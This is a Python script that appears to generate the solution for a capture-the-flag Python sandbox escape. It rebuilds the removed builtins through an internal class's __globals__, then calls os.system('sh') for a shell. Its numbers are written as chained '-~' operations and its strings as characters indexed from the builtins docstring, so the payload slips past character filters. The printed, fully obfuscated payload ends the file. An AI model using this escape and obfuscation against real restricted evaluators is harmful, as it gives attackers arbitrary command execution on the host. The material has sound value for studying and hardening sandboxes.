import re


def make_solve_script() -> str:
    # recovers builtins from _frozen_importlib._BlockingOnManager and does a |= (__ior__) with the current (empty) builtins dict, then from there we can use
    # all builtins as normal so we can just do a normal escape with __import__("os").__getattribute__("system")("sh")
    _BlockingOnManager_idx = 117
    base = f"""\
    [
        __globals__:=[].__class__.__base__.__subclasses__()[{_BlockingOnManager_idx}].__init__.__globals__,
        __builtins__.__ior__(__globals__[[*__globals__][5]]),
        __import__("os").__getattribute__("system")("sh")
    ]
    """

    # -~0 == 1, so just chain `num` of those to form any number
    def gen_num(num):
        assert num >= 0
        return "-~" * num + "[].__len__()"

    # so you can generate the solve for this without needing to be on the same version as remote
    builtins___doc__ = "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed."

    # after recovering builtins, we have the __doc__ of builtins so we can craft strings using that
    def gen_str(string):
        chunks = []
        for c in string:
            idx = builtins___doc__.index(c)
            chunks.append(f"__doc__[{gen_num(idx)}]")

        return "+".join(chunks)

    code = re.sub(r"\d+", lambda match: gen_num(int(match.group(0))), base)
    code = re.sub(r'"(.+?)"', lambda match: gen_str(match.group(1)), code)
    code = code.replace("    ", "").replace("\n", "")

    return code


if __name__ == '__main__':
    print(make_solve_script())
    # [__globals__:=[].__class__.__base__.__subclasses__()[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[].__len__()].__init__.__globals__,__builtins__.__ior__(__globals__[[*__globals__][-~-~-~-~-~[].__len__()]]),__import__(__doc__[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[].__len__()]+__doc__[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[].__len__()]).__getattribute__(__doc__[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[].__len__()]+__doc__[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[].__len__()]+__doc__[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[].__len__()]+__doc__[-~-~-~-~[].__len__()]+__doc__[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[].__len__()]+__doc__[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[].__len__()])(__doc__[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[].__len__()]+__doc__[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[].__len__()])]
